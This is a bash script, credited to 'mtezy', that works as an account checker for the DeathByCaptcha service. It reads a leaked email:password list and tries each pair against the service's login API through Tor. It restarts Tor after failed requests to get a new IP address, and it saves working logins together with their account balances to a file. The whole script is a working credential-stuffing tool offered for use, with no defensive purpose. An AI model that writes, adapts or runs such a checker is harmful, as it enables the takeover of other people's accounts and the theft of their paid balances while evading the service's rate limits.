#!/bin/bash
RED="\e[31m"
GREEN="\e[32m"
YELLOW="\e[33m"
CYAN="\e[36m"
LIGHTGREEN="\e[92m"
MARGENTA="\e[35m"
BLUE="\e[34m"
BOLD="\e[1m"
NOCOLOR="\e[0m"
PUTIH='\033[1;37m'
echo -e "\e[38;5;206m"
echo -e "\e[1m"
cat << "EOF"
        ---------------------------------------------------------
                        o   o                    o
                         \ /                     |
                          O    oo o  o o-o  o-o -o-
                         / \  | | |  | |  | |-'  |
                        o   o o-o-o--O o  o o-o  o
                                     |
                                  o--o / Deatchbycaptcha Account Checker
                                  Rewrite: mtezy
                                  
        ---------------------------------------------------------
 
EOF
 
printf "\e[38;5;50m"
cat << "thanks"
         Thanks : Extreme Crew - ccoocoot ccoocot
                  XAYNET - SGBTeam - Rumah Sakit Jiwa
                  
                  
thanks

ngecek() {
    res1=$(date +%s)
    start_date=$(date +%H:%M:%S)
    extract=$(echo ${1} | cut -d@ -f1)
	#cokjancok=$(curl -s "https://bo.doku.com/v2/" -i)
    # auth=$(echo "$cokjancok" | grep clientToken | grep -Po '(?<=value=")[^;]*' | cut -d '"' -f1)
 #  fetchCookie=$(echo "$cokjancok" | grep -Po '(?<=Set-Cookie:)[^;]*')
   #cookie=$(echo $cokjancok | grep -Po '(?<=JSESSIONID=)[^;]*')
     login=$(curl -s --socks5 127.0.0.1:9050 "http://api.dbcapi.me/api/user" -X POST \
  -H "application/x-www-form-urlencoded"  \
  -H "Accept: */*" \
  -H "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" \
  -H "Pragma: no-cache" \
  -d "username=${extract}&password=${2^}")
     loc=$(echo "$login" | grep -Po '(?<=status=)[^;]*' | cut -d '&' -f1)
     #csrfToken=$(echo "$getPage" | grep -Po '(?<=tokenCSRF =)[^;]*' | tr -d "'" | sort -u)
	if [[ $loc == *"255"* ]]; then
	printf "${NOCOLOR}[$i/$totalLines]${RED}[DIE] $loc => ${1}:${2^}${NC} \n"
	elif [[ $loc == *"0"* ]]; then
	balance=$(echo "$login" | grep -Po '(?<=balance=)[^;]*' | cut -d '&' -f1)
	printf "${NOCOLOR}[$i/$totalLines]${GREEN} INFO : $extract:$2 Saldo: $balance\n"
	echo "$extract:$2 Saldo: $balance" >> dbcaptcha.txt
	else
	killall -HUP tor
	printf "${NOCOLOR}[$i/$totalLines]${BLUE}[Failed]${NC} \n"
	fi
	
}  
	


echo ""
echo "List In This Directory : "
ls
echo "Delimeter list -> email:password "
echo -n "Masukan File List : "
    read list
    echo "[+] Calculate your mailist file"
    echo "############################"
    totalLines=`grep -c ":" $list`
    echo "There are $totalLines of list."
    echo "############################"
    if [ ! -f $list ]; then
echo "$list No Such File"
    exit
    fi
    x=$(gawk -F: '{ print $1 }' $list)
    y=$(gawk -F: '{ print $2 }' $list)
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'emailgblg=($x)'
    IFS=$'\r\n' GLOBIGNORE='*' command eval  'passwordna=($y)'
    for (( i = 0; i < "${#emailgblg[@]}"; i++ )); do
        emailna="${emailgblg[$i]}"
        kontol="${passwordna[$i]}"

        ngecek $emailna $kontol 
    done
    
   
    